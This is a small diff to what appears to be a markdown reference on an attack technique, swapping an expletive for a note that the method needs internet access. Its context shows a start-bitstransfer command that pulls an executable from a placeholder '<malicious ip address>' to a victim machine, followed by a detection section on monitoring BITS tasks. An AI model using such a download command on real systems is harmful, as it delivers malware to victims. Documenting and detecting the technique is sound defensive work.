@@ -14,7 +14,7 @@
     ```sh
     sharpps start-bitstransfer -source http://<malicious ip address>:12137/Abrodolph.exe -destination <victim save location>
     ```
-**SHIT AIN'T FUCKING WORKING GOD DAMMIT**
+**--Requires your device to be connected to the internet or have a default gateway configured--**
 ---
 ## Detection Method
 * Monitor for new BITS tasks being created
